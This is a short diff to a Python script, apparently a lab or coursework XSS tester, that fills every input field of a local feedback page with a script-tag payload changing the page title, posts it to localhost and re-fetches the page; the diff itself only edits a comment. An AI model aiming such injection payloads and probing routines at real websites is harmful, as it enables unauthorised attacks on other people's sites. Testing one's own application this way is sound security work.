@@ -12,7 +12,7 @@ def main():
     search = [(element['name']) for element in soup.find_all('input', attrs={'name': True})] # Search for elements with name 'input' in soup output [10]
     print(search) # print search output
     for x in search: # Iterate for every input found in search
-        payload.update({x : "<script>document.title = 'XSS Vulnerable' </script>"}) # Create payload script to change the document title
+        payload.update({x : "<script>document.title = 'XSS Vulnerable' </script>"}) # Create with input name and payload script to change the document title
     r = session.post('http://localhost:5000/feedback',payload) # Post payload to client
     print("Payload sent")
     render_page = render_session.get('http://localhost:5000/feedback') # Get updated content of public feedback page
